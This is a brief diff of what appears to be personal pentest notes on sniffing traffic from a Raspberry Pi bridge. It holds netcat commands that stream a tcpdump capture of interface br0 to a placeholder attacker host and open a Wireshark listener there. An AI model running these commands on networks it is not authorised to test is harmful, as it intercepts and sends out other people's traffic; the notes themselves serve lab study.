@@ -150,10 +150,7 @@ nc -l -p 9999 > capture.pcap
 on raspberry 
 tcpdump -s0 -U -n -w - -i br0 | nc <attakerIP> 9999
 
-tcpdump -s0 -U -n -w - -i br0 | nc 172.24.1.108 9999
-
-send tcpdump to wireshark attaker 
-
+send tcpdump to wireshark attaker (on attacker)
 nc -l -p 9999 | wireshark -k -S -i-
 
 ```
